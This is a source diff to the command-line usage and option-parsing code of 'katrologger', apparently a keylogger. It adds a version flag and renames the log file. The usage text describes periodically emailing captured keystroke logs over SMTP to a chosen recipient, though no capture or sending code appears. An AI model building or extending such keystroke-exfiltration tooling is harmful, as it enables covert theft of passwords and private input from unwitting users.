@@ -1,14 +1,19 @@
 #include "usage.h"
 
+void version(){
+  printf("katrologger version 1.0\n");
+  exit(0);
+}
+
 void help() {
-    fprintf(stderr,
-    "Usage:\n\tkatrologger [options]\n\n"
-    "\t-h, --help\n");
+  fprintf(stderr,
+  "Usage:\n\tkatrologger [options]\n\n"
+  "\t-h, --help\n");
   exit(0);
 }
 
 void smtp_helper(){
-    printf("Usage:\n\t--smtp-url smtp://smtp.exemple.com:port\n\t--mail-from <address>\n\t--pass <password>\n\t--mail-rcpt <address>\n\t--smtp-file /path/keylogger.log\n\t--time 1-60 Minutes\n");
+    printf("Usage:\n\t--smtp-url smtp://smtp.exemple.com:port\n\t--mail-from <address>\n\t--pass <password>\n\t--mail-rcpt <address>\n\t--smtp-file /path/keyscan.log\n\t--time 1-60 Minutes\n");
     exit(0);
 }
 
@@ -18,6 +23,7 @@ void usage() {
     printf("\t-k, --kill             Stop\n");
     printf("\t-s, --status           Status\n");
     printf("\t-h, --help             Help\n");
+    printf("\t-v, --version          Version\n");
 
     printf("\nSend Mail:\n");
     printf("\t--smtp-status          SMTP Status\n");
@@ -46,6 +52,7 @@ struct option long_options[] = {
   {"output", required_argument,    0, 'o'},
   {"kill",   no_argument,          0, 'k'},
   {"status", no_argument,          0, 's'},
+  {"version", no_argument,         0, 'v'},
   {"smtp-status", no_argument,     0,  1 },
   {"smtp-help", no_argument,       0,  2 },
   {"smtp-url",  required_argument, 0,  0 },
@@ -60,7 +67,7 @@ struct option long_options[] = {
 if (argc < 2)
   help();
 
-while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
+while((opt = getopt_long(argc, argv, "hvkso:01", long_options, NULL)) != -1) {
   switch (opt) {
     case 0:
         if (argc == 13) {
@@ -77,6 +84,9 @@ while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
       break;
     case 'h':
         usage();
+      break;
+    case 'v':
+        version();
       break;
     case 'o':
         strncpy(outfile, optarg, 99);
